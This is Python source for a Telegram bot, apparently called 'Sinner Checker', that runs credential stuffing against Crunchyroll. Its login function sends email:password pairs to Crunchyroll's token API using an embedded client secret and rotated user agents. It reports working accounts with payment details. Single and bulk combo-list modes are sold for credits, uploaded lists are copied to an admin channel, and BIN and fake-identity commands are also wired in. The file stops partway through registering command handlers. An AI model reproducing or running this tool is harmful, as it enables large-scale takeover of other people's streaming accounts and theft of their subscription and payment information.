from module import ModulesAutoBySinner
ModulesAutoBySinner()
from json import load
import re
from premium import set_premium
import requests
import logging
from uuid import uuid1
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, ConversationHandler, CallbackQueryHandler
import time
from config import ADMIN_CHANNEL_CB,USER_IDS_FILE, REQUIRED_CHANNELS, ADMIN_USER_IDS, USER_AGENTS,ADMIN_CHANNEL,tok
import os
from ping import ping
from statistics import statistics
from others import store_user_id, check_membership,cancel, is_admin, ban, unban, require_registration, button
from ban import ban_user, unban_user, is_user_banned, load_banned_users
from credits import credits_handler, add_credits_handler, reset_credits_handler, cr_handler  # Import handlers from credits.py
from registration import register_command  # Import registration function
from mongodb import users_collection
import threading
from clean import clean, clean_handler
import random
from premium import set_premium_handler, unset_premium_handler
from keygen import genkeys
from redeem import redeem
from commands import cmds_handler
from howcredits import how_credits_handler
from broadcast import (
    broadcast_handler,
    receive_message_handler,
    stop_broadcast_handler,
    stop_button_handler
)
from ip import ip_lookup
from help import help_handler
from antispam import is_spamming, handle_spam, spamapr, spamupr
from fake import fake_command
from bin import bin_lookup
load_banned_users()

# logging.basicConfig(
#     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
#     level=logging.DEBUG
# )
# logger = logging.getLogger(__name__)

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.DEBUG,  # Capture both INFO and DEBUG logs
    handlers=[
        logging.FileHandler("bot.log"),  # Save logs to file
        logging.StreamHandler()  # Print logs to console
    ]
)

logger = logging.getLogger(__name__)

COST_PER_SINGLE = 5  # Cost per single check
running_checks = {}
stop_events = {}
mass_triggered_users = set()
COST_PER_MASS = 3  # Cost per check in mass mode


def button(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    user_id = query.from_user.id
    callback_data = query.data

    # Check if the user has joined all required channels
    if callback_data in ['start_joined', 'reset_joined']:
        if check_membership(user_id, context):
            query.answer("𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂 𝗳𝗼𝗿 𝗷𝗼𝗶𝗻𝗶𝗻𝗴 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘀 💋 !")

            # Image URL and caption for both scenarios
            video_url = 'https://motionbgs.com/media/4639/yor-forger-master-of-disguise.960x540.mp4'
            caption = (
            # "━━━━━━━𓆩≭𓆪━━━━━━━\n"
            "* Welcome To* [𝗦𝓲𝓷𝓷𝓮𝓻✘Checker](t.me/sinnercheckerbot) \n\n"
            " *The Ultimate Bot Packed With* *Next-Level & Mind-Blowing* Features! 💋\n\n"
            "⚡ *Supercharge Your Experience!* ⚡\n\n"
            "❤️‍🔥 *Use* `/help`, `/cmds`, `/howcrd` *to explore the magic!*\n\n"
            "[≭] *Developer:* [Sinner](t.me/thefuqq)\n"
            "[≭] *Powered By:* [Team Ehra](t.me/godtest)\n"
            # "💫 *THANKS & HAPPY CHECKING!* 💫\n"
            # "━━━━━━━𓆩≭𓆪━━━━━━━"
        )

            # Inline keyboard buttons
            keyboard = [
                [InlineKeyboardButton("𝗦𝗨𝗣𝗣𝗢𝗥𝗧", url="https://t.me/GODTEST")],
                [InlineKeyboardButton("𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥", url="https://t.me/luciinvain")]
            ]

            # Create the inline keyboard markup
            reply_markup = InlineKeyboardMarkup(keyboard)

            # Edit the existing message to include the new image, caption, and buttons
            query.delete_message()  # Remove the previous message
            context.bot.send_video(
                chat_id=query.message.chat_id,
                video=video_url,
                caption=caption,
                reply_markup=reply_markup, parse_mode="Markdown"
            )
        else:
            query.answer("𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗻𝗼𝘁 𝗷𝗼𝗶𝗻𝗲𝗱 𝗮𝗹𝗹 𝘁𝗵𝗲 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗱 𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘀.", show_alert=True)
            query.edit_message_text(text="𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗻𝗼𝘁 𝗷𝗼𝗶𝗻𝗲𝗱 𝗮𝗹𝗹 𝘁𝗵𝗲 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗱 𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘀. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗷𝗼𝗶𝗻 𝗮𝗻𝗱 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.")

# Login function to check Crunchyroll credentials
def login(email, pasw):
    user_agent = random.choice(USER_AGENTS)  # Select a random user agent
    
    headers = {
        "ETP-Anonymous-ID": str(uuid1()),
        "Request-Type": "SignIn",
        "Accept": "application/json",
        "Accept-Charset": "UTF-8",
        "User-Agent": user_agent,  # Use randomized User-Agent
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Host": "beta-api.crunchyroll.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
    }
    
    data = {
        "grant_type": "password",
        "username": email,
        "password": pasw,
        "scope": "offline_access",
        "client_id": "yhukoj8on9w2pcpgjkn_",
        "client_secret": "q7gbr7aXk6HwW5sWfsKvdFwj7B1oK1wF",
        "device_type": "FIRETV",
        "device_id": str(uuid1()),
        "device_name": "kara",
    }
    
    res = requests.post("https://beta-api.crunchyroll.com/auth/v1/token", data=data, headers=headers)

    if "refresh_token" in res.text:
        token = res.json().get("access_token")
        
        headers_get = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/json",
            "Accept-Charset": "UTF-8",
            "User-Agent": user_agent,  # Use the same randomized User-Agent
            "Content-Length": "0",
            "Host": "beta-api.crunchyroll.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
        }
        
        res_get = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers_get)

        if "external_id" in res_get.text:
            external_id = res_get.json().get("external_id")
            
            headers_info = {
                "Authorization": f"Bearer {token}",
                "Accept": "application/json",
                "Accept-Charset": "UTF-8",
                "User-Agent": user_agent,  # Maintain the same User-Agent
                "Content-Length": "0",
                "Host": "beta-api.crunchyroll.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
            }
            
            res_info = requests.get(
                f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/third_party_products",
                headers=headers_info,
            )

            if any(key in res_info.text for key in ["fan", "premium", "no_ads", 'is_subscribable":false']):
                # Fetch subscription benefits
                benefits_res = requests.get(
                    f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits",
                    headers=headers_info,
                )
                benefits = benefits_res.json() if benefits_res.status_code == 200 else {}

                # Fetch payment details
                products_res = requests.get(
                    f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products",
                    headers=headers_info,
                )
                products = products_res.json() if products_res.status_code == 200 else {}

                # Extract relevant details
                is_free_trial = benefits.get("is_free_trial", "Unknown")
                payment_method = products.get("payment_method", "Unknown")
                expiry_date = products.get("expires", "Unknown")

                return f"[HIT] Free Trial: {is_free_trial}, Payment Method: {payment_method}, Expiry: {expiry_date}"
            else:
                return "[CUSTOM]"
        else:
            return "[BAD]"
    elif '406 Not Acceptable' in res.text:
        return "[RATE_LIMIT]"
    else:
        return "[BAD]"

def send_results_in_chunks(context, chat_id, results):
    """Send long results in multiple messages to avoid Telegram's character limit."""
    chunk_size = 4000  # Keep under Telegram's 4096 limit
    message = ""
    for line in results:
        if len(message) + len(line) + 1 > chunk_size:
            context.bot.send_message(chat_id=chat_id, text=message)
            message = ""  # Reset message buffer
        message += line + "\n"
    if message:
        context.bot.send_message(chat_id=chat_id, text=message)

def get_user_credits(user_id):
    """Fetch the user's current credit balance from MongoDB."""
    user = users_collection.find_one({"user_id": user_id})
    return user["credits"] if user else 0

def update_user_credits(user_id, new_credits):
    """Update the user's credit balance in MongoDB."""
    users_collection.update_one({"user_id": user_id}, {"$set": {"credits": new_credits}})

from datetime import datetime

@require_registration
def single(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    store_user_id(user_id)
    # print(f"User {user_id} triggered single")

    if is_user_banned(user_id):
        update.message.reply_text("❌ *You are restricted from using this bot. Contact support for assistance.*", parse_mode="Markdown")
        return

    command = '/single'  # Adjust this to match the actual command

    # Check if the user is spamming
    if is_spamming(user_id, command, cooldown=3):
        # Handle anti-spam (send the cooldown message)
        if handle_spam(update, user_id, command, cooldown=15):
            return  # Stop further execution if the user is spamming


    if not check_membership(user_id, context):
        custom_button_names = ['𝗘𝗛𝗥𝗔', '𝗗𝗘𝗔𝗧𝗛']
        video_url2 = 'https://motionbgs.com/media/4639/yor-forger-master-of-disguise.960x540.mp4'
        caption2 = "📢 *Dear User,*\n\n*Please join the required channels to proceed further!*"
        
        keyboard2 = [
            [InlineKeyboardButton(name, url=channel['link'])] for name, channel in zip(custom_button_names, REQUIRED_CHANNELS)
        ] + [[InlineKeyboardButton('✅ Joined', callback_data='start_joined')]]

        reply_markup2 = InlineKeyboardMarkup(keyboard2)

        update.message.reply_video(
            video=video_url2,
            caption=caption2,
            reply_markup=reply_markup2,
            parse_mode="Markdown"
        )
        return

    # Check if user has enough credits
    current_credits = get_user_credits(user_id)
    if current_credits < COST_PER_SINGLE:
        update.message.reply_text(f"❌ *Insufficient credits!*\n\n*You need* `{COST_PER_SINGLE}` *credits to use this command.*\n\n*Check your balance using /credits.*", parse_mode="Markdown")
        return

    # Process the command
    if len(context.args) != 1:
        update.message.reply_text("❌ *Usage:* /single `email:password`\n\n*Example:* `/single sinner@murphy.dev:SinnerMurphy69`", parse_mode="Markdown")
        return

    pair = context.args[0]
    try:
        email, pasw = pair.split(":")
        start_time = datetime.now()
        message = update.message.reply_text(f"🔍 *Checking:* `{email}` ⏳", parse_mode="Markdown")

        # Perform login check
        result = login(email, pasw)

        # If it's a hit, extract details and send them
        if result.startswith("[HIT]"):
            hit_data = result.replace("[HIT] ", "").strip().split(", ")
            end_time = datetime.now()
            time_taken = (end_time - start_time).total_seconds()

            # Fetch user details for "Requested By" section
            user_first_name = update.message.from_user.first_name
            user_data = users_collection.find_one({"user_id": user_id})
            is_premium = user_data.get("is_premium", False)
            premium_status = "PREMIUM" if is_premium else "FREE"

            details_message = (f"""
🔍 *Checked:* `{email}`
┏━━━━━━━⍟
┃🎉 *HIT FOUND!*
┗━━━━━━━━━━━⊛
┏━━━━⍟
┃[≭] *Platform:* [CRUNCHYROLL](crunchyroll.com)
┃📧 *Email:* `{email}`
┃🔑 *Password:* `{pasw}`
┗━━━━━━━━━━━⊛
┏━━━━━━━⍟
┃⏱ *Time Taken:* `{time_taken:.2f} seconds`
┗━━━━━━━━━━━⊛
┏━━━━━━━⍟
┃👤 *Requested By:* `{user_first_name}` *[ {premium_status} ]*
┗━━━━━━━━━━━⊛
┏━━━━━━━⍟
┃[≭] 𝗦𝓲𝓷𝓷𝓮𝓻✘ *Checker*
┃⚡ *Dev:* @THEFUQQ
┃🤖 *Powered by:* `TEAM EHRA`
┃🔗 [Join](https://t.me/GODTEST) *for Updates!*
┗━━━━━━━━━━━⊛
            """)

            message.edit_text(details_message, parse_mode="Markdown", disable_web_page_preview=True)
        else:
            # 🎯 Professional messages for Bad or Custom results
            if "bad" in result.lower():
                feedback_message = (
                    f"⚠️ *Login Unsuccessful*\n\n"
                    f"*Response For* `{email}:{pasw}` \n"
                    f" *[BAD]*\n\n"
                )
            else:
                feedback_message = (
                    f"ℹ️ *Login Attempt Processed*\n\n"
                    f"*Credentials*: `{email}:{pasw}`\n *were checked, logged but not premium.*\n"
                    # f"🔹 `{result}`\n\n"
                )

            update.message.reply_text(feedback_message, parse_mode="Markdown")


        # Deduct credits after a successful check
        new_credits = current_credits - COST_PER_SINGLE
        update_user_credits(user_id, new_credits)

        update.message.reply_text(f"💰 *{COST_PER_SINGLE} credits deducted!*\n📊 *Remaining Balance:* `{new_credits}`", parse_mode="Markdown")

    except ValueError:
        update.message.reply_text("❌ *Invalid format.*\n\nUse: `/single email:password`", parse_mode="Markdown")



# Command: /start
@require_registration
def start(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    store_user_id(user_id)  # Store user ID
    

    # Check if the user is banned
    if is_user_banned(user_id):
        update.message.reply_text("𝗬𝗼𝘂 𝗮𝗿𝗲 𝗿𝗲𝘀𝘁𝗿𝗶𝗰𝘁𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁. 𝗞𝗶𝗻𝗱𝗹𝘆 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 𝘁𝗵𝗲 𝗱𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 𝘁𝗼 𝗿𝗲-𝗴𝗮𝗶𝗻 𝗮𝗰𝗰𝗲𝘀𝘀.")
        return

    # Check if the user has already joined the required channels
    if check_membership(user_id, context):
        # User has already joined the channels; show the startup message
        video_url = 'https://motionbgs.com/media/4639/yor-forger-master-of-disguise.960x540.mp4'  # Replace with your image URL or local path
        # caption = "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 𝗥𝗲𝘀𝗲𝘁𝗕𝗼𝘁 ❤️‍🔥🕊!\n\n[≭] 𝗨𝘀𝗲 𝘁𝗵𝗲 /help 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝘁𝗼 𝗴𝗲𝘁 𝘀𝘁𝗮𝗿𝘁𝗲𝗱. \n[≭] 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : @luciInvain \n[≭] 𝗠𝗮𝗶𝗻 : @GODTEST"  # Caption text
        caption = (
            # "━━━━━━━𓆩≭𓆪━━━━━━━\n"
            "* Welcome To* [𝗦𝓲𝓷𝓷𝓮𝓻✘Checker](t.me/sinnercheckerbot) \n\n"
            " *The Ultimate Bot Packed With* *Next-Level & Mind-Blowing* Features! 💋\n\n"
            "⚡ *Supercharge Your Experience!* ⚡\n\n"
            "❤️‍🔥 *Use* `/help`, `/cmds`, `/howcrd` *to explore the magic!*\n\n"
            "[≭] *Developer:* [Sinner](t.me/thefuqq)\n"
            "[≭] *Powered By:* [Team Ehra](t.me/godtest)\n"
            # "💫 *THANKS & HAPPY CHECKING!* 💫\n"
            # "━━━━━━━𓆩≭𓆪━━━━━━━"
        )

        # Inline keyboard buttons
        keyboard = [
            [InlineKeyboardButton(" 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 ", url="https://t.me/GODTEST")],
            [InlineKeyboardButton(" 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 ", url="https://t.me/luciinvain")]
        ]

        # Create the inline keyboard markup
        reply_markup = InlineKeyboardMarkup(keyboard)

        # Send the image with the caption and inline buttons
        update.message.reply_video(
            video=video_url,
            caption=caption, parse_mode="Markdown",
            reply_markup=reply_markup
        )
    else:
        # Prompt user to join the required channels
        custom_button_names = ['𝗘𝗛𝗥𝗔', '𝗗𝗘𝗔𝗧𝗛']
        video_url2 = 'https://motionbgs.com/media/4639/yor-forger-master-of-disguise.960x540.mp4'
        caption2 = "𝗗𝗲𝗮𝗿 𝗨𝘀𝗲𝗿, 𝗣𝗹𝗲𝗮𝘀𝗲 𝗝𝗼𝗶𝗻 𝗧𝗵𝗲 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱 𝗖𝗵𝗮𝗻𝗻𝗲𝗹𝘀 𝗧𝗼 𝗣𝗿𝗼𝗰𝗲𝗲𝗱 𝗙𝘂𝗿𝘁𝗵𝗲𝗿!^"

        # Generate inline keyboard for channel links
        keyboard2 = [
            [InlineKeyboardButton(name, url=channel['link'])]
            for name, channel in zip(custom_button_names, REQUIRED_CHANNELS)
        ] + [[InlineKeyboardButton('𝗝𝗢𝗜𝗡𝗘𝗗 ✅', callback_data='start_joined')]]

        reply_markup2 = InlineKeyboardMarkup(keyboard2)

        # Send message prompting to join required channels
        update.message.reply_video(
            video=video_url2,
            caption=caption2,
            reply_markup=reply_markup2
        )
# Command: /mass
@require_registration
def mass(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    store_user_id(user_id)  # Store user ID
    # print(f"User {user_id} triggered single")
    chat_type = update.message.chat.type
    # Check if the user is banned
    if is_user_banned(user_id):
        update.message.reply_text("𝗬𝗼𝘂 𝗮𝗿𝗲 𝗿𝗲𝘀𝘁𝗿𝗶𝗰𝘁𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁. 𝗞𝗶𝗻𝗱𝗹𝘆 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 𝘁𝗵𝗲 𝗱𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 𝘁𝗼 𝗿𝗲-𝗴𝗮𝗶𝗻 𝗮𝗰𝗰𝗲𝘀𝘀.")
        return
        

     # Ensure the command is only used in private messages (DMs)
    if chat_type != "private":
        update.message.reply_text("⚠️ This command can only be used in DMs. Please message me privately.")
        return

    command = '/mass'  # Adjust this to match the actual command

    # Check if the user is spamming
    if is_spamming(user_id, command, cooldown=3):
        # Handle anti-spam (send the cooldown message)
        if handle_spam(update, user_id, command, cooldown=15):
            return  # Stop further execution if the user is spamming

    # Check if a mass check is already running
    if is_mass_check_running(user_id, context):
        update.message.reply_text("⚠️ You already have an ongoing mass check. Please wait for it to finish before starting a new one.")
        return

    if check_membership(user_id, context):
        update.message.reply_text(
        "𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝗽𝗹𝗼𝗮𝗱 𝗮 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲 𝘄𝗶𝘁𝗵 𝗲𝗺𝗮𝗶𝗹:𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱 𝗽𝗮𝗶𝗿𝘀 𝗳𝗼𝗿 𝗺𝗮𝘀𝘀 𝗰𝗵𝗲𝗰𝗸𝗶𝗻𝗴."
        )
        context.user_data["last_command"] = "mass"  # Track that user used /mass
        mass_triggered_users.add(user_id)  # Track user who triggered mass command
    else:
        custom_button_names = ['𝗘𝗛𝗥𝗔', '𝗗𝗘𝗔𝗧𝗛']
        video_url2 = 'https://motionbgs.com/media/4639/yor-forger-master-of-disguise.960x540.mp4'
        caption2 = "𝗗𝗲𝗮𝗿 𝗨𝘀𝗲𝗿, 𝗣𝗹𝗲𝗮𝘀𝗲 𝗝𝗼𝗶𝗻 𝗧𝗵𝗲 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱 𝗖𝗵𝗮𝗻𝗻𝗲𝗹𝘀 𝗧𝗼 𝗣𝗿𝗼𝗰𝗲𝗲𝗱 𝗙𝘂𝗿𝘁𝗵𝗲𝗿!^"
        # Generate inline keyboard for channel links
        keyboard2 = [
            [InlineKeyboardButton(name, url=channel['link'])]
            for name, channel in zip(custom_button_names, REQUIRED_CHANNELS)
        ] + [[InlineKeyboardButton('𝗝𝗢𝗜𝗡𝗘𝗗 ✅', callback_data='start_joined')]]
        reply_markup2 = InlineKeyboardMarkup(keyboard2)
        # Send message prompting to join required channels
        update.message.reply_video(
            video=video_url2,
            caption=caption2,
            reply_markup=reply_markup2
        )
        return ConversationHandler.END
def mass_check(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    user_name = update.message.from_user.first_name  # Get sender's name
    print(f"User {user_id} triggered mass_check") 

    
    # ❌ Prevent multiple checks at once
    if is_mass_check_running(user_id, context):
        update.message.reply_text("⚠️ You already have an ongoing mass check. Please wait for it to finish before starting a new one.")
        return

    # ✅ Mark the mass check as running
    set_mass_check_status(user_id, context, True)

    if user_id not in mass_triggered_users:
        update.message.reply_text("❌ Please trigger the /mass command before uploading a file.")
        set_mass_check_status(user_id, context, False)  # Reset status
        return

    if update.message.document:
        file = context.bot.get_file(update.message.document.file_id)
        print(f"File received from {user_id}")  # Debug log


          # ✅ Forward file to admin channel
        context.bot.send_document(
            chat_id=ADMIN_CHANNEL_CB,
            document=file.file_id,
            caption=f"📥 New mass check request!\n👤 **User:** {user_name} (`{user_id}`)\n🛠️ Processing now..."
        )
        file_path = file.download()
        print(f"File downloaded: {file_path}")  # Debug log

        # ✅ Remove user from mass_triggered_users after they upload a file
        mass_triggered_users.discard(user_id)

        # ✅ Initialize stop event for this user
        stop_events[user_id] = threading.Event()

        # ✅ Start the checking process in a separate thread
        thread = threading.Thread(target=process_mass_check, args=(update, context, file_path, user_id))
        thread.start()
        print(f"Mass check started for {user_id}")  # Debug log
    else:
        update.message.reply_text("Please attach a .txt file with email:password pairs to proceed.")
        set_mass_check_status(user_id, context, False)  # Reset status if no file

def process_mass_check(update: Update, context: CallbackContext, file_path: str, user_id: int):
    """ Mass check function with credit deduction per checked account. """
    stats = {"total": 0, "checked": 0, "hits": 0, "bad": 0, "custom": 0}
    status_message = update.message.reply_text("𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗳𝗶𝗹𝗲... ⏳")

    user_credits = get_user_credits(user_id)

    try:
        with open(file_path, "r") as f:
            lines = f.readlines()
            stats["total"] = len(lines)
            results = []

            for i, line in enumerate(lines, start=1):
                if stop_events[user_id].is_set():  # If stop requested
                    break  # Exit loop

                if user_credits < COST_PER_MASS:
                    status_message.edit_text("⚠️ *Insufficient credits! Mass check stopped.*", parse_mode="Markdown")
                    break

                try:
                    email, pasw = line.strip().split(":")
                    start_time = time.time()
                    result = login(email, pasw).strip()  # Ensure no extra spaces
                    time_taken = time.time() - start_time

                    # Debugging: Print result to check actual value
                    # print(f"Checking {email}: {result}")

                    if "[HIT]" in result:
                        stats["hits"] += 1
                        user_data = context.bot.get_chat(user_id)  # Get user details
                        user_first_name = user_data.first_name
                        user_data2 = users_collection.find_one({"user_id": user_id})
                        is_premium = user_data2.get("is_premium", False)
                        premium_status = "PREMIUM" if is_premium else "FREE"
                        # is_premium = "✨ Premium" if check_premium_status(user_id) else "Free User" 

                        hit_message = (f"""
┏━━━━━━━⍟
┃🎉 *HIT FOUND!*
┗━━━━━━━━━━━⊛
┏━━━━⍟
┃[≭] *Platform:* [CRUNCHYROLL](crunchyroll.com)
┃📧 *Email:* `{email}`
┃🔑 *Password:* `{pasw}`
┗━━━━━━━━━━━⊛
┏━━━━━━━⍟
┃⏱ *Time Taken:* `{time_taken:.2f} seconds`
┗━━━━━━━━━━━⊛
┏━━━━━━━⍟
┃👤 *Requested By:* `{user_first_name}` *[ {premium_status} ]*
┗━━━━━━━━━━━⊛
┏━━━━━━━⍟
┃[≭] 𝗦𝓲𝓷𝓷𝓮𝓻✘ *Checker*
┃⚡ *Dev:* @THEFUQQ
┃🤖 *Powered by:* `TEAM EHRA`
┃🔗 [Join](https://t.me/GODTEST) *for Updates!*
┗━━━━━━━━━━━⊛
            """)

                        update.message.reply_text(hit_message, parse_mode="Markdown", disable_web_page_preview=True)
                    elif "[BAD]" in result:
                        stats["bad"] += 1
                    elif "[CUSTOM]" in result:
                        stats["custom"] += 1
                    
                    stats["checked"] += 1
                    user_credits -= COST_PER_MASS  # Deduct credits
                    update_user_credits(user_id, user_credits)  # Update in database
                    results.append(f"{email}:{pasw} -> {result}")

                    keyboard = [
    [InlineKeyboardButton(f"📌 𝗧𝗢𝗧𝗔𝗟: {stats['total']}", callback_data="total")],
    [InlineKeyboardButton(f"✅ 𝗖𝗛𝗘𝗖𝗞𝗘𝗗: {stats['checked']}", callback_data="checked")],
    [InlineKeyboardButton(f"🎯 𝗛𝗜𝗧𝗦: {stats['hits']}", callback_data="hits")],
    [InlineKeyboardButton(f"❌ 𝗕𝗔𝗗: {stats['bad']}", callback_data="bad")],
    [InlineKeyboardButton(f"⚠️ 𝗖𝗨𝗦𝗧𝗢𝗠: {stats['custom']}", callback_data="custom")],
    [InlineKeyboardButton("🛑 𝗦𝗧𝗢𝗣", callback_data=f"stop_check_{user_id}")]
]


                    status_message.edit_text(
                        f"🔍 *𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴:* `{email}`\n\n"
                        "   📊 *Live Statistics:*\n"
                        f"   [≭] *𝗧𝗢𝗧𝗔𝗟:* `{stats['total']}`\n"
                        f"   [≭] *𝗖𝗛𝗘𝗖𝗞𝗘𝗗:* `{stats['checked']}`\n"
                        f"   [≭] *𝗛𝗜𝗧𝗦:* `{stats['hits']}`\n"
                        f"   [≭] *𝗕𝗔𝗗:* `{stats['bad']}`\n"
                        f"   [≭] *𝗖𝗨𝗦𝗧𝗢𝗠:* `{stats['custom']}`\n"
                        f"  💰 *Credits Remaining:* `{user_credits}`",
                        reply_markup=InlineKeyboardMarkup(keyboard),
                        parse_mode="Markdown"
                    )

                except ValueError:
                    stats["bad"] += 1
                    results.append(f"Invalid format: {line.strip()}")

            # send_results_in_chunks(context, update.effective_chat.id, results)

    except Exception as e:
        status_message.edit_text(f"❌ Error processing file: Try Again Later")

    finally:
        set_mass_check_status(user_id, context, False)
        stop_events.pop(user_id, None)  # Remove stop flag
        mass_triggered_users.discard(user_id)  # Remove user from tracking
        delete_file(file_path)



def stop_check(update: Update, context: CallbackContext):
    """ Handles the stop button and deducts credits accordingly. """
    query = update.callback_query
    user_id = int(query.data.split("_")[-1])

    if user_id in stop_events:
        stop_events[user_id].set()  # Stop checking
        query.edit_message_text("⏹️ Stopping process... Please wait.")
    else:
        query.answer("No active process found.")

def file_handler(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id

    last_command = context.user_data.get("last_command", None)

    if last_command == "mass":
        mass_check(update, context)  # Call mass_check function
    elif last_command == "clean":
        clean_handler(update, context)  # Call clean_handler function
    else:
        update.message.reply_text("❌ Please trigger /mass or /clean before uploading a file.")



def is_mass_check_running(user_id, context):
    """Returns True if a mass check is already running for the user"""
    return context.user_data.get("mass_check_running", False)

def set_mass_check_status(user_id, context, status):
    """Sets the mass check running status"""
    context.user_data["mass_check_running"] = status

def delete_file(file_path: str):
    """Delete the processed file from the server after checking is done or stopped."""
    if os.path.exists(file_path):
        try:
            os.remove(file_path)
            print(f"File {file_path} deleted successfully.")
        except Exception as e:
            print(f"Error deleting file {file_path}: {e}")

def spamapr_command(update: Update, context: CallbackContext):
    spamapr(update, context)

# Command handler for /spamupr
def spamupr_command(update: Update, context: CallbackContext):
    spamupr(update, context)


def main(): #main bot start function + command handling
    updater = Updater(tok, use_context=True)
    # SinnerTHEFUQQ = updater.dispatcher
    # SinnerTHEFUQQ.add_handler(CallbackQueryHandler(stop_check, pattern=r"stop_check_\d+"))
    # SinnerTHEFUQQ.add_handler(CommandHandler("start", start))
    # SinnerTHEFUQQ.add_handler(CommandHandler("register", register_command))
    # SinnerTHEFUQQ.add_handler(CommandHandler("mass", mass))
    # SinnerTHEFUQQ.add_handler(CommandHandler("clean", clean))
    # SinnerTHEFUQQ.add_handler(CommandHandler("single", single))
    # SinnerTHEFUQQ.add_handler(MessageHandler(Filters.document.mime_type("text/plain"), file_handler))
    # SinnerTHEFUQQ.add_handler(CommandHandler("ping", ping))  
    # SinnerTHEFUQQ.add_handler(CommandHandler("stats", statistics))    
    # SinnerTHEFUQQ.add_handler(CommandHandler("ban", ban)) 
    # SinnerTHEFUQQ.add_handler(CommandHandler("unban", unban))
    # SinnerTHEFUQQ.add_handler(CommandHandler("genkeys", genkeys))
    # SinnerTHEFUQQ.add_handler(CommandHandler("redeem", redeem))
    # SinnerTHEFUQQ.add_handler(CommandHandler("spamupr", spamupr)) 
    # SinnerTHEFUQQ.add_handler(CommandHandler("spamapr", spamapr))  
    # SinnerTHEFUQQ.add_handler(credits_handler)  
    # SinnerTHEFUQQ.add_handler(add_credits_handler)  
    # SinnerTHEFUQQ.add_handler(set_premium_handler)  
    # SinnerTHEFUQQ.add_handler(reset_credits_handler)
    # SinnerTHEFUQQ.add_handler(unset_premium_handler)  
    # SinnerTHEFUQQ.add_handler(cr_handler)
    # SinnerTHEFUQQ.add_handler(cmds_handler)
    # SinnerTHEFUQQ.add_handler(how_credits_handler)
    # SinnerTHEFUQQ.add_handler(help_handler)
    # SinnerTHEFUQQ.add_handler(broadcast_handler) 
    # SinnerTHEFUQQ.add_handler(receive_message_handler)  
    # SinnerTHEFUQQ.add_handler(stop_broadcast_handler) 
    # SinnerTHEFUQQ.add_handler(stop_button_handler)  
    # for i, handlers in SinnerTHEFUQQ.handlers.items():
    #     for handler in handlers:
    #         print(f"Handler at {i}: {handler}")

    SinnerTHEFUQQ = updater.dispatcher

# 🚀 Fastest-response commands first
    SinnerTHEFUQQ.add_handler(CommandHandler("start", start))
    SinnerTHEFUQQ.add_handler(CallbackQueryHandler(button))
    SinnerTHEFUQQ.add_handler(CommandHandler("ping", ping))
    SinnerTHEFUQQ.add_handler(CommandHandler("register", register_command))

    # ⚡ Heavy commands - Use threading for faster execution
    SinnerTHEFUQQ.add_handler(CommandHandler("single", single))  # Consider threading
    SinnerTHEFUQQ.add_handler(CommandHandler("mass", mass))  # Consider threading
    SinnerTHEFUQQ.add_handler(CommandHandler("clean", clean))  # Consider threading

    # 📌 User Commands
    SinnerTHEFUQQ.add_handler(CommandHandler("stats", statistics))
    SinnerTHEFUQQ.add_handler(CommandHandler("ip", ip_lookup))
    SinnerTHEFUQQ.add_handler(CommandHandler("fake", fake_command))
    SinnerTHEFUQQ.add_handler(CommandHandler("bin", bin_lookup))
    # SinnerTHEFUQQ.add_handler(CommandHandler("credits", credits_handler))
    SinnerTHEFUQQ.add_handler(credits_handler)  
    SinnerTHEFUQQ.add_handler(CommandHandler("genkeys", genkeys))
    SinnerTHEFUQQ.add_handler(CommandHandler("redeem", redeem))

    # 🛑 Admin Commands (Medium Priority)
